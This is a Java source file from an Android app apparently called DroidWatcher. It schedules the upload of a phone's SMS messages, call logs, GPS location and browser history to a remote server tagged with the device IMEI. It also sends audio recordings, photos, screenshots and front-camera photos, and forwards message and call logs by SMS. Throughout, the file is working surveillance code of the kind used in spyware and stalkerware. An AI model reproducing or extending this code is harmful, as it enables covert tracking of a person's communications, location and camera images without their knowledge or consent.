package com.droidwatcher;

import java.util.ArrayList;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import com.droidwatcher.FileSender.FileType;
import com.droidwatcher.lib.GPS;
import com.droidwatcher.lib.IMessageBody;
import com.droidwatcher.lib.MessageType;
import com.droidwatcher.receivers.ConnectionReceiver;
import com.droidwatcher.variables.DBResult;
import com.droidwatcher.variables.ServerMessage;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.support.v4.content.LocalBroadcastManager;

public class ThreadManager {
	private Context mContext;
	private DBManager mDbManager;
	private SettingsManager mSettings;
	private BroadcastReceiver mReceiver;
	private ExecutorService mExecutorService;
	
	private boolean mIsCallThreadReady = true;
	private boolean mIsSmsThreadReady = true;
	private boolean mIsBrowserThreadReady = true;
	
	private static final Long SLEEP = 1 * 1000L;
	
	private static long sLastUpdate = 0L;
	private static final long UPDATE_PERIOD = 10 * 60 * 1000L;
	
	public ThreadManager(Context context){
		this.mContext = context;
		this.mDbManager = new DBManager(context);
		this.mSettings = new SettingsManager(context);
		this.mExecutorService = Executors.newSingleThreadExecutor();
		
		this.mReceiver = new BroadcastReceiver() {
			@Override
			public void onReceive(Context context, Intent intent) {
				sendLogs();
			}
		};
		
		LocalBroadcastManager.getInstance(context).registerReceiver(mReceiver, new IntentFilter(ConnectionReceiver.NETWORK_AVAILABLE));
	}
	
	public void dispose(){
		Debug.i("[ThreadManager] dispose;");
		
		LocalBroadcastManager.getInstance(mContext).unregisterReceiver(mReceiver);
		mDbManager.close();
		mDbManager = null;
		
		try {
			mExecutorService.awaitTermination(5L, TimeUnit.SECONDS);
		} catch (InterruptedException e) {
			Debug.exception(e);
			mExecutorService = null;
		}
	}
	
	public synchronized void addTask(Runnable runnable){
		this.mExecutorService.submit(runnable);
	}
	
	public synchronized void onSMSChange(){
		if (!mIsSmsThreadReady){
			return;
		}
		
		mIsSmsThreadReady = false;
		mExecutorService.submit(new Runnable() {
			public void run() {
				try {
					Thread.sleep(SLEEP);
					
				} catch (InterruptedException e) {
					Debug.exception(e);
					
				} finally{
					mIsSmsThreadReady = true;
				}
				
				smsUpdate();
			}
		});
	}
	
	public synchronized void onCallChange(){
		if (!mIsCallThreadReady){
			return;
		}
		
		mIsCallThreadReady = false;
		mExecutorService.submit(new Runnable() {
			public void run() {
				try {
					Thread.sleep(SLEEP);
					
				} catch (InterruptedException e) {
					Debug.exception(e);
					
				} finally{
					mIsCallThreadReady = true;
				}
				
				callUpdate();				
			}
		});
	}
	
	public synchronized void resetBrowserHistory(){
		mDbManager.resetBrowserHistory();
	}
	
	public synchronized void onBrowserHistoryChange(){
		if (!mIsBrowserThreadReady){
			return;
		}
		
		mIsBrowserThreadReady = false;
		mExecutorService.submit(new Runnable() {
			public void run() {
				try {
					Thread.sleep(5 * SLEEP);
					
				} catch (InterruptedException e) {
					Debug.exception(e);
					
				} finally{
					mIsBrowserThreadReady = true;
				}
				
				browserHistoryUpdate();				
			}
		});
	}
	
	public void onGPSChange(final GPS gps){
		if (networkAvailable()){
			ArrayList<IMessageBody> list = new ArrayList<IMessageBody>(1);
			list.add(gps);
			ServerMessage msg = new ServerMessage(MessageType.GPS, mSettings.imei(), mSettings.login(), list);
			new ServerMessanger(mContext, msg, new ServerMessanger.ICallBack() {
				@Override
				public void onSuccess() { }
				@Override
				public boolean onFinished(String response) { return false; }
				
				@Override
				public void onError() {
					mExecutorService.submit(new Runnable() {
						public void run() {
							mDbManager.addGPS(gps);
						}
					});
				}
				
			}).start();
		}
		else{
			mExecutorService.submit(new Runnable() {
				public void run() {
					mDbManager.addGPS(gps);
				}
			});
		}
	}
	
	private synchronized void sendLogs(){
		Long currentDate = new Date().getTime();
		if ((currentDate - sLastUpdate) > UPDATE_PERIOD && networkAvailable()){
			sLastUpdate = currentDate;
			
			sendToServer(mDbManager.getSMS(), MessageType.SMS);
			sendToServer(mDbManager.getCalls(), MessageType.CALL);
			sendToServer(mDbManager.getGPS(), MessageType.GPS);
			
			if (mSettings.isBrowserHistoryEnabled()) {
				sendToServer(mDbManager.getBrowserHistory(), MessageType.BROWSER);
			}
		}
		
		if (networkAvailable_files()) {
			mExecutorService.submit(new FileSender(mContext, FileType.RECORD));
			mExecutorService.submit(new FileSender(mContext, FileType.PHOTO));
			mExecutorService.submit(new FileSender(mContext, FileType.SCREENSHOT));
			mExecutorService.submit(new FileSender(mContext, FileType.FRONT_CAMERA_PHOTO));
		}
		
		mExecutorService.submit(new Runnable() {
			@Override
			public void run() {
				SmsNotification smsNotify = new SmsNotification(mContext);
				DBResult result = null;
				
				result = mDbManager.getSMS(true);
				if (result != null){
					if (smsNotify.notifySms()) {
						smsNotify.sendSmsLog(result.getBodyList());
						mDbManager.updateSmsSentStatus(MessageType.SMS, result.getIdList());
					}
					else{
						mDbManager.updateSmsSentStatus(MessageType.SMS, result.getIdList());
					}
				}
				
				result = mDbManager.getCalls(true);
				if (result != null){
					if (smsNotify.notifyCall()) {
						smsNotify.sendCallLog(result.getBodyList());
						mDbManager.updateSmsSentStatus(MessageType.CALL, result.getIdList());
					}
					else{
						mDbManager.updateSmsSentStatus(MessageType.CALL, result.getIdList());
					}
				}
			}
		});
	}
	
	private void sendToServer(DBResult result, MessageType type){
		if (result == null) {
			return;
		}
		
		while (result.hasElements()) {
			ArrayList<Long> idList = new ArrayList<Long>(30);
			ArrayList<IMessageBody> bodyList = new ArrayList<IMessageBody>(30);
			result.getElements(30, idList, bodyList);
			ServerMessage msg = new ServerMessage(type, mSettings.imei(), mSettings.login(), bodyList);
			
			mExecutorService.submit(
				new ServerMessanger(mContext, msg, new ResponseHandler(type, idList))
			);
		}
		
	}
	
	public synchronized void sendFiles(){
		if (networkAvailable_files()) {
			mExecutorService.submit(new FileSender(mContext, FileType.RECORD));
			mExecutorService.submit(new FileSender(mContext, FileType.PHOTO));
			mExecutorService.submit(new FileSender(mContext, FileType.SCREENSHOT));
			mExecutorService.submit(new FileSender(mContext, FileType.FRONT_CAMERA_PHOTO));
		}
	}
	
	private void smsUpdate(){
		if (!mDbManager.compareSMS()){
			return;
		}
		
		SmsNotification smsNotify = new SmsNotification(mContext);
		Boolean network = networkAvailable();
		
		if (!network && ! smsNotify.notifySms()){
			return;
		}
		
		DBResult result = mDbManager.getSMS();
		if (result.getIdList().size() == 0) {
			return;
		}
		
		if (network && result.hasElements()) {
			ServerMessage msg = new ServerMessage(MessageType.SMS, mSettings.imei(), mSettings.login(), result.getBodyList());
			new ServerMessanger(mContext, msg, new ResponseHandler(MessageType.SMS, result.getIdList())).run();
		}
		
		if (smsNotify.notifySms()) {
			result = mDbManager.getSMS(true);
			if (result.getIdList().size() > 0) {
				smsNotify.sendSmsLog(result.getBodyList());
			}
		}
		
		mDbManager.updateSmsSentStatus(MessageType.SMS, result.getIdList());
	}
	
	private void callUpdate(){
		if (!mDbManager.compareCall()){
			return;
		}
		
		SmsNotification smsNotify = new SmsNotification(mContext);
		
		Boolean network = networkAvailable();
		
		if (!network && ! smsNotify.notifyCall()){
			return;
		}
		
		DBResult result = mDbManager.getCalls();
		if (result.getIdList().size() == 0) {
			return;
		}
		
		if (network) {
			ServerMessage msg = new ServerMessage(MessageType.CALL, mSettings.imei(), mSettings.login(), result.getBodyList());
			new ServerMessanger(mContext, msg, new ResponseHandler(MessageType.CALL, result.getIdList())).run();
		}
		
		if (smsNotify.notifyCall()) {
			result = mDbManager.getCalls(true);
			if (result.getIdList().size() > 0) {
				smsNotify.sendCallLog(result.getBodyList());
			}
		}
		
		mDbManager.updateSmsSentStatus(MessageType.CALL, result.getIdList());
	}
	
	private void browserHistoryUpdate(){
		if (!mDbManager.compareBrowserHistory()){
			return;
		}
		
		if (!networkAvailable()){
			return;
		}
		
		DBResult result = mDbManager.getBrowserHistory();
		if (result.getIdList().size() == 0) {
			return;
		}
		
		ServerMessage msg = new ServerMessage(MessageType.BROWSER, mSettings.imei(), mSettings.login(), result.getBodyList());
		new ServerMessanger(mContext, msg, new ResponseHandler(MessageType.BROWSER, result.getIdList())).run();
	}
	
	private Boolean networkAvailable(){
		ConnectivityManager manager = (ConnectivityManager)mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();
		
		if (info == null){
			return false;
		}
		
		if (mSettings.onlyWiFi() && info.getType() != ConnectivityManager.TYPE_WIFI){
			return false;
		}
		
		return info.isConnectedOrConnecting();
	}
	
	private Boolean networkAvailable_files(){
		ConnectivityManager manager = (ConnectivityManager)mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();
		
		if (info == null){
			return false;
		}
		
		if ((mSettings.onlyWiFi() || mSettings.filesOnlyWiFi()) && info.getType() != ConnectivityManager.TYPE_WIFI){
			return false;
		}
		
		return info.isConnectedOrConnecting();
	}
	
	private class ResponseHandler implements ServerMessanger.ICallBack{
		private MessageType mType;
		private ArrayList<Long> mIdList;
		
		public ResponseHandler(MessageType type, ArrayList<Long> idList){
			mType = type;
			mIdList = idList;
		}
		
		@Override
		public void onSuccess() {
			mDbManager.updateSentStatus(mType, mIdList);
		}
		
		@Override
		public boolean onFinished(String response) { return false; }

		@Override
		public void onError() { }
	}
}
